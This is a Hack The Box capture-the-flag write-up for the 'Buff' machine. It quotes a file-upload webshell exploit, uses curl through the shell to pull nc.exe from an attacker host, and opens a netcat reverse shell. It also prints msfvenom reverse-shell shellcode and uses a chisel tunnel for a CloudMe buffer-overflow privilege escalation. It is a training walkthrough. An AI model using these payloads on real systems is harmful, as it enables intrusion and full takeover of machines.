# HTB - Buff

## Overview

![](https://github.com/zweilosec/htb-writeups/tree/a5e382064576687994dad818cec556b49685a824/windows-machines/easy/machine%3E.infocard.png)

Short description to include any strange things to be dealt with - I wish I had taken better notes on this one, since I had done it so long ago I don't remember it so well!...

## Useful Skills and Tools

#### Useful thing 1

* description with generic example

#### Useful thing 2

* description with generic example

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of `10.10.10.198`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.

At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally.

```text
zweilos@kali:~/htb/buff$ nmap -p- -sC -sV --reason -oN buff.nmap -Pn 10.10.10.198
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-22 10:13 EDT
Nmap scan report for 10.10.10.198
Host is up, received user-set (0.10s latency).
Not shown: 65533 filtered ports
Reason: 65533 no-responses
PORT     STATE SERVICE    REASON  VERSION
7680/tcp open  pando-pub? syn-ack
8080/tcp open  http       syn-ack Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 474.18 seconds
```

Only found two open ports: 7680 which nmap reported \(with low confidence\) as `pando-pub` and 8080, which hosted an Apache HTTP web server.

### http

mrbe3n's Bro Hut - on about page Gym Management Software 1.0 - contact page

[https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/](https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/) [https://www.exploit-db.com/exploits/48506](https://www.exploit-db.com/exploits/48506)

> Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution \(RCE\) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters. Exploit Details:
>
> ```text
> #   1. Access the '/upload.php' page, as it does not check for an authenticated user session.
> #   2. Set the 'id' parameter of the GET request to the desired file name for the uploaded PHP file.
> #     - `upload.php?id=kamehameha`
> #     /upload.php:
> #        4 $user = $_GET['id'];
> #       34       move_uploaded_file($_FILES["file"]["tmp_name"],
> #       35       "upload/". $user.".".$ext);
> #   3. Bypass the extension whitelist by adding a double extension, with the last one as an acceptable extension (png).
> #     /upload.php:
> #        5 $allowedExts = array("jpg", "jpeg", "gif", "png","JPG");
> #        6 $extension = @end(explode(".", $_FILES["file"]["name"]));
> #       14 && in_array($extension, $allowedExts))
> #   4. Bypass the file type check by modifying the 'Content-Type' of the 'file' parameter to 'image/png' in the POST request, and set the 'pupload' paramter to 'upload'.
> #        7 if(isset($_POST['pupload'])){
> #        8 if ((($_FILES["file"]["type"] == "image/gif")
> #       11 || ($_FILES["file"]["type"] == "image/png")
> #   5. In the body of the 'file' parameter of the POST request, insert the malicious PHP code:
> #       <?php echo shell_exec($_GET["telepathy"]); ?>
> #   6. The Web Application will rename the file to have the extension with the second item in an array created from the file name; seperated by the '.' character.
> #       30           $pic=$_FILES["file"]["name"];
> #       31             $conv=explode(".",$pic);
> #       32             $ext=$conv['1'];
> #   - Our uploaded file name was 'kaio-ken.php.png'. Therefor $conv['0']='kaio-ken'; $conv['1']='php'; $conv['2']='png'; 
> #   7. Communicate with the webshell at '/upload.php?id=kamehameha' using GET Requests with the telepathy parameter.
> ```

```text
┌──(zweilos㉿kali)-[~/htb/buff]
└─$ python3 ./buff-exploit.py 'http://10.10.10.198:8080/'                                           1 ⨯
            /\
/vvvvvvvvvvvv \--------------------------------------,                                                  
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.

Exiting.
```

Plink is a command-line connection tool similar to UNIX ssh. It is mostly used for automated operations, such as making CVS access a repository on a remote server. Plink is probably not what you want if you want to run an interactive session in a console window

```text
10.10.10.198:8080//upload/kamehameha.php?telepathy=DIR

PNG  Volume in drive C has no label. Volume Serial Number is A22D-49F7 Directory of C:\xampp\htdocs\gym\upload 22/08/2020 17:19
. 22/08/2020 17:19
.. 22/08/2020 17:19 54 kamehameha.php 22/08/2020 16:43 59,392 nc.exe 22/08/2020 16:55 311,296 plink.exe 3 File(s) 370,742 bytes 2 Dir(s) 7,398,789,120 bytes free
```

```text
GET /upload/kamehameha.php?telepathy=curl.exe+"http%3a//10.10.15.82%3a8090/nc.exe"+-o+nc.exe HTTP/1.1
Host: 10.10.10.198:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: sec_session_id=frdg4eee55pa3lu6ugvu3cnuts
Upgrade-Insecure-Requests: 1
DNT: 1
```

## Initial Foothold

```text
http://10.10.10.198:8080//upload/kamehameha.php?telepathy=nc.exe%20-e%20powershell.exe%2010.10.15.82%2012346

┌──(zweilos㉿kali)-[~/htb/buff]
└─$ nc -lvnp 12346                                                                                  1 ⨯
listening on [any] 12346 ...
connect to [10.10.15.82] from (UNKNOWN) [10.10.10.198] 51161
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\gym\upload>
PS C:\xampp\htdocs\gym\upload> whoami /all
whoami /all

USER INFORMATION
----------------

User Name  SID                                           
========== ==============================================
buff\shaun S-1-5-21-2277156429-3381729605-2640630771-1001


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                     Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

ERROR: Unable to get user claims information.

PS C:\xampp\htdocs\gym\upload> systeminfo
systeminfo

Host Name:                 BUFF
OS Name:                   Microsoft Windows 10 Enterprise
OS Version:                10.0.17134 N/A Build 17134
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          shaun
Registered Organization:   
Product ID:                00329-10280-00000-AA218
Original Install Date:     16/06/2020, 15:05:58
System Boot Time:          22/08/2020, 16:40:19
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 19/06/2019
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,336 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 2,305 MB
Virtual Memory: In Use:    2,494 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.198
                                 [02]: fe80::68fa:10a9:abda:25fd
                                 [03]: dead:beef::d9f1:b233:54f6:380f
                                 [04]: dead:beef::68fa:10a9:abda:25fd
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

so now I was user `shaun` on `BUFF`

```text
PS C:\Users\shaun> cd Documents 
cd Documents
PS C:\Users\shaun\Documents> ls
ls


    Directory: C:\Users\shaun\Documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       16/06/2020     22:26             30 Tasks.bat
PS C:\Users\shaun\Documents> cat Tasks.bat
cat Tasks.bat
START C:/xampp/xampp_start.exe
```

Tasks.bat was a very simple script that simply started a service

## Road to User

### Further enumeration

### Finding user creds

### User.txt

```text
PS C:\Users\shaun\desktop> ls
ls


    Directory: C:\Users\shaun\desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---       22/08/2020     16:43             34 user.txt                                                              


PS C:\Users\shaun\desktop> cat user.txt
cat user.txt
c414e3e8aff37e36d3e0ef36a3c8cdc3
```

Got the user flag!

## Path to Power \(Gaining Administrator Access\)

### Enumeration as `shaun`

```text
PS C:\xampp> ls
ls


    Directory: C:\xampp


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       16/06/2020     16:31                anonymous                                                             
d-----       16/06/2020     16:31                apache                                                                
d-----       16/06/2020     16:33                cgi-bin                                                               
d-----       16/06/2020     16:31                contrib                                                               
d-----       16/06/2020     16:32                htdocs                                                                
d-----       16/06/2020     16:31                img                                                                   
d-----       16/06/2020     16:33                install                                                               
d-----       16/06/2020     16:31                licenses                                                              
d-----       16/06/2020     16:31                locale                                                                
d-----       16/06/2020     16:31                mailoutput                                                            
d-----       16/06/2020     16:31                mailtodisk                                                            
d-----       16/06/2020     16:31                mysql                                                                 
d-----       16/06/2020     16:32                perl                                                                  
d-----       16/06/2020     16:33                php                                                                   
d-----       16/06/2020     18:11                phpMyAdmin                                                            
d-----       16/06/2020     16:31                src                                                                   
d-----       22/08/2020     17:56                tmp                                                                   
d-----       16/06/2020     16:31                webdav                                                                
-a----       07/06/2013     12:15            436 apache_start.bat                                                      
-a----       16/06/2020     16:33            176 apache_stop.bat                                                       
-a----       30/03/2013     12:29           9439 catalina_service.bat                                                  
-a----       22/10/2019     14:36           4478 catalina_start.bat                                                    
-a----       22/10/2019     14:35           4180 catalina_stop.bat                                                     
-a----       16/06/2020     16:31           2731 ctlscript.bat                                                         
-a----       30/03/2013     12:29             78 filezilla_setup.bat                                                   
-a----       07/06/2013     12:15            150 filezilla_start.bat                                                   
-a----       07/06/2013     12:15            149 filezilla_stop.bat                                                    
-a----       27/08/2019     15:01            299 killprocess.bat                                                       
-a----       07/06/2013     12:15            136 mercury_start.bat                                                     
-a----       07/06/2013     12:15             60 mercury_stop.bat                                                      
-a----       03/06/2019     12:39            471 mysql_start.bat                                                       
-a----       16/06/2020     16:33            256 mysql_stop.bat                                                        
-a----       13/03/2017     11:04            824 passwords.txt                                                         
-a----       16/06/2020     16:33            791 properties.ini                                                        
-a----       18/05/2020     07:55           7497 readme_de.txt                                                         
-a----       18/05/2020     07:55           7367 readme_en.txt                                                         
-a----       30/03/2013     12:29          60928 service.exe                                                           
-a----       30/03/2013     12:29           1255 setup_xampp.bat                                                       
-a----       18/12/2019     17:25           1671 test_php.bat                                                          
-a----       16/06/2020     16:34         214845 uninstall.dat                                                         
-a----       16/06/2020     16:34       12554862 uninstall.exe                                                         
-a----       05/06/2019     13:10        3368448 xampp-control.exe                                                     
-a----       14/07/2020     13:41           1202 xampp-control.ini                                                     
-a----       14/07/2020     13:41          16136 xampp-control.log                                                     
-a----       16/06/2020     16:31           1084 xampp_shell.bat                                                       
-a----       30/03/2013     12:29         118784 xampp_start.exe                                                       
-a----       30/03/2013     12:29         118784 xampp_stop.exe
```

Directory listing of xammp folder

```text
PS C:\xampp> cat xampp-control.log
cat xampp-control.log
16:34:10  [main]        Initializing Control Panel
16:34:10  [main]        Windows Version:  Enterprise  64-bit
16:34:10  [main]        XAMPP Version: 7.4.6
16:34:10  [main]        Control Panel Version: 3.2.4  [ Compiled: Jun 5th 2019 ]
16:34:10  [main]        You are not running with administrator rights! This will work for
16:34:10  [main]        most application stuff but whenever you do something with services
16:34:10  [main]        there will be a security dialogue or things will break! So think 
16:34:10  [main]        about running this application with administrator rights!
16:34:10  [main]        XAMPP Installation Directory: "c:\xampp\"
16:34:10  [main]        Checking for prerequisites
16:34:11  [main]        All prerequisites found
16:34:11  [main]        Initializing Modules
16:34:11  [main]        The FileZilla module is disabled
16:34:11  [main]        The Mercury module is disabled
16:34:11  [main]        The Tomcat module is disabled
16:34:11  [main]        Starting Check-Timer
16:34:11  [main]        Control Panel Ready
16:34:16  [Apache]      Attempting to start Apache app...
16:34:17  [Apache]      Status change detected: running
16:34:18  [mysql]       Attempting to start MySQL app...
16:34:18  [mysql]       Status change detected: running
16:35:59  [Apache]      Attempting to stop Apache (PID: 948)
16:35:59  [Apache]      Attempting to stop Apache (PID: 8512)
16:35:59  [Apache]      Status change detected: stopped
16:36:00  [Apache]      Attempting to start Apache app...
16:36:00  [Apache]      Status change detected: running
16:39:35  [Apache]      Attempting to stop Apache (PID: 7732)
16:39:35  [Apache]      Attempting to stop Apache (PID: 10460)
16:39:36  [Apache]      Status change detected: stopped
16:39:36  [Apache]      Attempting to start Apache app...
16:39:36  [Apache]      Status change detected: running
16:40:12  [main]        Deinitializing Modules
16:40:12  [main]        Deinitializing Control Panel

...snipped...
```

so xampp requires administrative rights, and is version 7.4.6, and control panel 3.2.4

[https://www.apachefriends.org/blog/new\_xampp\_20200519.html](https://www.apachefriends.org/blog/new_xampp_20200519.html)

[https://meterpreter.org/xampp/](https://meterpreter.org/xampp/)

> XAMPP \(stands for Cross-Platform \(X\), Apache \(A\), MariaDB \(M\), PHP \(P\) and Perl \(P\)\) is very easy to install Apache Distribution for Linux, Solaris, Windows, and Mac OS X. The package includes the Apache web server, MySQL, PHP, Perl, an FTP server and phpMyAdmin. It is a simple, lightweight Apache distribution that makes it extremely easy for developers to create a local web server for testing and deployment purposes. Everything needed to set up a web server – server application \(Apache\), database \(MariaDB\), and scripting language \(PHP\) – is included in an extractable file. It is also cross-platform, which means it works equally well on Linux, Mac, and Windows. Since most actual web server deployments use the same components as XAMPP, it makes transitioning from a local test server to a live server.

[https://social.technet.microsoft.com/Forums/en-US/cfa65a6f-3f8c-42ca-9978-bdbffdc99ec5/how-do-i-edit-a-text-file-in-powershell](https://social.technet.microsoft.com/Forums/en-US/cfa65a6f-3f8c-42ca-9978-bdbffdc99ec5/how-do-i-edit-a-text-file-in-powershell)

> `(Get-Content .\input.txt ).Replace('text','fun') | Out-File .\output.txt`

```text
PS C:\xampp> cat passwords.txt
cat passwords.txt
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf

   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  

   Please do not forget to refresh the WEBDAV authentification (users and passwords)
```

found passwords.txt

```text
   PS C:\xampp> cat mysql_start.bat
cat mysql_start.bat
@echo off
cd /D %~dp0
echo Diese Eingabeforderung nicht waehrend des Running beenden
echo Please dont close Window while MySQL is running
echo MySQL is trying to start
echo Please wait  ...
echo MySQL is starting with mysql\bin\my.ini (console)

mysql\bin\mysqld --defaults-file=mysql\bin\my.ini --standalone

if errorlevel 1 goto error
goto finish

:error
echo.
echo MySQL konnte nicht gestartet werden
echo MySQL could not be started
pause

:finish
```

myslq\_start.bat

```text
PS C:\xampp\mysql\bin> ./mysqldump.exe --all-databases -u root > ~/Downloads/dmp.txt      
./mysqldump.exe --all-databases -u root > ~/Downloads/dmp.txt
```

[https://dev.mysql.com/doc/refman/5.7/en/mysqldump-sql-format.html](https://dev.mysql.com/doc/refman/5.7/en/mysqldump-sql-format.html)

```text
PS C:\xampp\mysql> ls
ls


    Directory: C:\xampp\mysql


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       16/06/2020     16:31                backup                                                                
d-----       16/06/2020     16:33                bin                                                                   
d-----       22/08/2020     18:36                data                                                                  
d-----       16/06/2020     16:31                scripts                                                               
d-----       16/06/2020     16:31                share                                                                 
-a----       10/12/2019     13:47          17987 COPYING                                                               
-a----       10/12/2019     13:47           2354 CREDITS                                                               
-a----       10/12/2019     13:47           8245 EXCEPTIONS-CLIENT                                                     
-a----       30/03/2013     12:29            848 mysql_installservice.bat                                              
-a----       30/03/2013     12:29            395 mysql_uninstallservice.bat                                            
-a----       10/12/2019     13:47           3102 README.md                                                             
-a----       03/06/2019     12:39           1095 resetroot.bat                                                         
-a----       10/12/2019     13:47          86263 THIRDPARTY
```

found an interesting batch script in the mysql folder

```text
PS C:\xampp\mysql> cat resetroot.bat
cat resetroot.bat
@echo off
echo USE mysql; >resetroot.sql
echo. >>resetroot.sql
echo REPLACE INTO user VALUES ('localhost', 'root', '', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', '', '', '', '', 0, 0, 0, 0, '', ''); >>resetroot.sql
echo REPLACE INTO user VALUES ('127.0.0.1', 'root', '', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', '', '', '', '', 0, 0, 0, 0, '', ''); >>resetroot.sql
echo REPLACE INTO user VALUES ('localhost', 'pma', '', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', ''); >>resetroot.sql

bin\mysqld.exe --no-defaults --bind-address=127.0.0.1 --bootstrap --standalone <resetroot.sql >nul
del resetroot.sql
echo.
echo Passwoerter fuer Benutzer "root" und "pma" wurden geloescht.
echo Passwords for user "root" and "pma" were deleted.
echo.
pause
```

reset the root login for sql

```text
PS C:\xampp\mysql\bin> ./mysql.exe -u root
./mysql.exe -u root
```

msql

```text
New XAMPP release 7.2.31 , 7.3.18 , 7.4.6

Hi Apache Friends!

We just released a new version of XAMPP. You can download these new installers at http://www.apachefriends.org/download.html.

These installers include the next components:

7.2.31-0 / 7.3.18-0 / 7.4.6-0

    PHP 7.2.31 , 7.3.18 , 7.4.6
    Apache 2.4.43
    MariaDB 10.4.11
    Perl 5.16.3
    OpenSSL 1.1.1g (UNIX only)
    phpMyAdmin 5.0.2

Enjoy!
```

Non-rabbit =

```text
PS C:\Users\shaun\Downloads> ls
ls


    Directory: C:\Users\shaun\Downloads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       16/06/2020     16:26       17830824 CloudMe_1112.exe
```

Found `Cloudme_1112.exe` in the `/Downloads` folder

```text
PS C:\Program Files (x86)> ps
ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
-------  ------    -----      -----     ------     --  -- -----------                                                  
    439      24    19616       8632              6800   1 ApplicationFrameHost                                         
    161      10     1920       1676              6592   1 browser_broker                                               
    351      24    32768      37816              2932   0 CloudMe                                                      
    278      17     3024       1324       0.30   4264   0 CloudMe_1112                                                 
    270      17     2964       2416       0.88   7528   0 CloudMe_1112
```

ps

```text
┌──(zweilos㉿kali)-[~]
└─$ searchsploit cloudme
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow (PoC)                                | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                       | windows/local/48499.txt
Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                      | windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)               | windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)        | windows/remote/44175.rb
CloudMe Sync 1.11.0 - Local Buffer Overflow                           | windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                       | windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)              | windows_x86-64/remote/46250.py
CloudMe Sync < 1.11.0 - Buffer Overflow                               | windows/remote/44027.py
CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)            | windows_x86-64/remote/44784.py
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

I had to test multiple of the exploits before I found one that actually worked. I'm certain that it was more the fact that this was an easy box that was being hammered by many many people. Even after choosing the right exploit I had to reset the machine to get it to run. had to recompile some of the shellcode in the exploit with the provided msfvenom command

```text
┌──(zweilos㉿kali)-[~]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.220 LPORT=12345 -f c                                       
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of c file: 1386 bytes
unsigned char buf[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x0e\xdc\x68"
"\x02\x00\x30\x39\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
"\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44"
"\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56"
"\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff"
"\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
```

two options for creating a tunnel in order to run the local exploit against the remote machine. plink?

```text
https://www.ssh.com/ssh/putty/putty-manuals/0.68/Chapter7.html
https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
```

or chisel? [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) [https://www.puckiestyle.nl/pivot-with-chisel/](https://www.puckiestyle.nl/pivot-with-chisel/) [https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)

```text
PS C:\Users\shaun\Downloads> ./chi.exe client 10.10.15.82:8099 R:8888:127.0.0.1:8888
./chi.exe client 10.10.15.82:8099 R:8888:127.0.0.1:8888
2020/08/23 23:43:11 client: Connecting to ws://10.10.15.82:8099
2020/08/23 23:43:12 client: Fingerprint 4c:09:ee:d3:88:28:01:8e:ef:aa:e3:36:db:ef:a1:80
2020/08/23 23:43:13 client: Connected (Latency 53.5461ms)
```

[http://10.10.10.198:8080/upload/kamehameha.php?telepathy=nc.exe -e powershell.exe 10.10.14.220 12346](http://10.10.10.198:8080/upload/kamehameha.php?telepathy=nc.exe%20-e%20powershell.exe%2010.10.14.220%2012346)

Had to manuallly upload both nc.exe and chisel.exe...used burp repeater

```text
┌──(zweilos㉿kali)-[~/htb/buff]
└─$ chisel server -p 8099 --reverse                                        
2020/08/23 18:27:12 server: Reverse tunnelling enabled
2020/08/23 18:27:12 server: Fingerprint 4c:09:ee:d3:88:28:01:8e:ef:aa:e3:36:db:ef:a1:80
2020/08/23 18:27:12 server: Listening on 0.0.0.0:8099...
2020/08/23 18:37:42 server: proxy#1:R:0.0.0.0:8888=>127.0.0.1:8888: Listening
```

R:8000:127.0.0.1:7890

### Getting a shell

```text
┌──(zweilos㉿kali)-[~]
└─$ nc -lvnp 12345                                                                                  1 ⨯
listening on [any] 12345 ...
connect to [10.10.18.82] from (UNKNOWN) [10.10.10.198] 49702
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd c:/users/administrator/desktop
cd c:/users/administrator/desktop

c:\Users\Administrator\Desktop>whoami /all
whoami /all

USER INFORMATION
----------------

User Name          SID                                          
================== =============================================
buff\administrator S-1-5-21-2277156429-3381729605-2640630771-500


GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes                                                     
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group             
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\BATCH                                            Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group             
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group             
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group             
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288                                                                


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
